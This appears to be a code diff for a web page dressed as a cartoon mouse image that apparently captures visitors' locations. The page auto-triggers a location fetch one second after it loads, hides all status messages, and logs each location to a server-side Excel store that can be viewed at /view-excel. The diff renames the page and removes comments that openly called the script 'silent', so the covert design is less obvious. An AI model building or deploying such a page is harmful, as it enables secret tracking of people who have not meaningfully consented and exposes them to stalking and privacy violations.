@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mickey Mouse Location Tracker</title>
+    <title>Potti Megnana Golivi - Location Tracker</title>
     <style>
         * {
             margin: 0;
@@ -176,7 +176,7 @@
             50% { transform: translateY(-5px); }
         }
         
-        /* HIDDEN STATUS - No messages visible */
+        /* Hidden status - no messages */
         .status-message {
             display: none;
         }
@@ -201,38 +201,36 @@
             font-weight: 600;
             font-family: 'Comic Sans MS', cursive, sans-serif;
             margin: 5px;
-        }
-        
-        .btn-map {
-            background: #007bff;
-            color: white;
             width: 100%;
         }
         
-        .btn-map:hover {
-            background: #0056b3;
-            transform: scale(1.02);
-        }
-        
-        .btn-excel {
-            background: #28a745;
+        .btn-view-excel {
+            background: #17a2b8;
             color: white;
-            width: 100%;
         }
         
-        .btn-excel:hover {
-            background: #218838;
+        .btn-view-excel:hover {
+            background: #138496;
             transform: scale(1.02);
         }
         
         .btn-refresh {
             background: #ffd93d;
             color: #1a1a2e;
-            width: 100%;
         }
         
         .btn-refresh:hover {
             background: #f9c900;
+            transform: scale(1.02);
+        }
+        
+        .btn-map {
+            background: #007bff;
+            color: white;
+        }
+        
+        .btn-map:hover {
+            background: #0056b3;
             transform: scale(1.02);
         }
         
@@ -261,7 +259,6 @@
             font-size: 0.8rem;
         }
         
-        /* Loading spinner - subtle */
         .loading-spinner {
             display: none;
             width: 30px;
@@ -312,22 +309,22 @@
             </div>
         </div>
         
-        <h1>🐭 Mickey's Tracker</h1>
-        <p class="subtitle">Click Mickey to capture your location</p>
+        <h1>🐭 Potti Megnana Golivi</h1>
+        <p class="subtitle">Click to capture your location</p>
         
         <!-- Mickey Mouse Image -->
         <div class="mickey-image" onclick="manualFetchLocation()">
             <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 200'%3E%3Ccircle cx='100' cy='100' r='90' fill='%23f5f5f5'/%3E%3Ccircle cx='50' cy='50' r='40' fill='%231a1a2e'/%3E%3Ccircle cx='150' cy='50' r='40' fill='%231a1a2e'/%3E%3Ccircle cx='100' cy='110' r='70' fill='%231a1a2e'/%3E%3Ccircle cx='70' cy='95' r='15' fill='white'/%3E%3Ccircle cx='130' cy='95' r='15' fill='white'/%3E%3Ccircle cx='75' cy='100' r='7' fill='%231a1a2e'/%3E%3Ccircle cx='125' cy='100' r='7' fill='%231a1a2e'/%3E%3Cellipse cx='100' cy='120' rx='12' ry='8' fill='%23ff6b6b'/%3E%3Cpath d='M85 130 Q100 140 115 130' stroke='white' stroke-width='3' fill='none'/%3E%3C/svg%3E" 
-                 alt="Mickey Mouse" 
+                 alt="Potti Megnana Golivi" 
                  id="mickeyImage"
-                 title="Click me to get your location!" />
-            <div class="click-hint">👆 Click Mickey</div>
+                 title="Click to track location!" />
+            <div class="click-hint">👆 Click Here</div>
         </div>
         
-        <!-- Hidden status - no messages shown -->
+        <!-- Hidden status -->
         <div id="status" class="status-message"></div>
         
-        <!-- Loading spinner (subtle) -->
+        <!-- Loading spinner -->
         <div class="loading-spinner" id="loadingSpinner"></div>
         
         <!-- Hidden result -->
@@ -345,29 +342,30 @@
         </div>
         
         <div class="button-group">
-            <button onclick="manualFetchLocation()" class="btn btn-refresh">🔄 Refresh</button>
-            <a href="/download-excel" target="_blank" class="btn btn-excel">📊 Download Excel</a>
+            <button onclick="manualFetchLocation()" class="btn btn-refresh">🔄 Refresh Location</button>
+            <a href="/view-excel" target="_blank" class="btn btn-view-excel">📊 View All Data</a>
         </div>
         
         <div class="excel-count" id="locationCount">📊 Total: 0 locations</div>
         
         <footer>
-            <p>🐭 All locations saved to Excel silently</p>
+            <p>🐭 All locations saved to Excel</p>
+            <p style="font-size: 11px; margin-top: 5px;">📋 View data at: /view-excel</p>
         </footer>
     </div>
     
     <script>
-        // ===== SILENT SCRIPT - NO MESSAGES =====
+        // ===== SCRIPT =====
         let autoFetched = false;
         
         // Update location count only
         async function updateLocationCount() {
             try {
-                const response = await fetch('/api/locations');
+                const response = await fetch('/api/count');
                 const result = await response.json();
-                if (result.success && result.data) {
+                if (result.success) {
                     document.getElementById('locationCount').textContent = 
-                        `📊 Total: ${result.data.length} locations`;
+                        `📊 Total: ${result.count} locations`;
                 }
             } catch (error) {}
         }
@@ -474,10 +472,9 @@
         
         // ===== PAGE LOAD =====
         window.addEventListener('load', () => {
-            console.log('🐭 Silent Location Tracker loaded');
+            console.log('🐭 Potti Megnana Golivi loaded');
             updateLocationCount();
             
-            // Auto-fetch after 1 second (silent)
             setTimeout(() => {
                 autoFetchLocation();
             }, 1000);
